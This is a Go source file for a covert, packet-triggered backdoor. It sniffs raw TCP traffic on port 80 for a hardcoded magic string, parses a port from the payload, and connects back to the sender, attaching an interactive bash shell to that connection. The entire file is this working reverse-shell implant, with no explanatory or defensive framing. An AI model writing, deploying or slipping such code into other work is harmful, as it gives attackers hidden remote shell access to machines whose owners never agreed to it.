package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"sync"
	"syscall"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

var packets = make(chan gopacket.Packet, 10)

// MagicNumber Listen to packets whose payload starts with this number
var MagicNumber = "xVUOcOIljRTgY2MWMK0piQ=="

func main() {
	var listenGroup, workerGroup sync.WaitGroup

	listenGroup.Add(1)
	go listen(80, &listenGroup, &workerGroup)
	listenGroup.Wait()
}

func listen(port layers.TCPPort, listenGroup *sync.WaitGroup, workerGroup *sync.WaitGroup) {
	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	f := os.NewFile(uintptr(fd), fmt.Sprintf("fd %d", fd))

	for {
		ipBuf := make([]byte, 1024)
		numRead, err := f.Read(ipBuf)
		if err != nil {
			fmt.Println(err)
		}
		packet := gopacket.NewPacket(ipBuf[:numRead], layers.LayerTypeIPv4, gopacket.Default)

		if tcpLayer := packet.Layer(layers.LayerTypeTCP); tcpLayer != nil {
			tcp, _ := tcpLayer.(*layers.TCP)
			if tcp.DstPort == port {
				payload := string(tcp.Payload)
				if strings.HasPrefix(payload, MagicNumber) {
					workerGroup.Add(1)
					go handlePacket(packet, workerGroup)
				}
			}
		}
	}
	workerGroup.Wait()
	listenGroup.Done()
}

func handlePacket(packet gopacket.Packet, wg *sync.WaitGroup) {
	ip, _ := packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
	tcp, _ := packet.Layer(layers.LayerTypeTCP).(*layers.TCP)
	srcIP := ip.SrcIP
	srcPort := tcp.SrcPort
	fmt.Println(srcIP)
	fmt.Println(srcPort)
	addr := srcIP.String()
	fmt.Println(addr)
	addr += ":" + strings.TrimSpace(strings.TrimPrefix(string(tcp.Payload), MagicNumber))
	fmt.Println(addr)
	runReverseShell(addr)
	wg.Done()
}

func runReverseShell(addr string) {
	conn, err := net.Dial("tcp", addr)
	fmt.Println("Connection: ", conn)
	fmt.Println("Error: ", err)
	if conn != nil {
		shellCmd := exec.Command("/bin/bash", "-i", "-c", "script /dev/null")
		shellCmd.Stdin = conn
		shellCmd.Stdout = conn
		shellCmd.Stderr = conn
		shellCmd.Run()
		fmt.Println("Done!")
		conn.Close()
	}
}
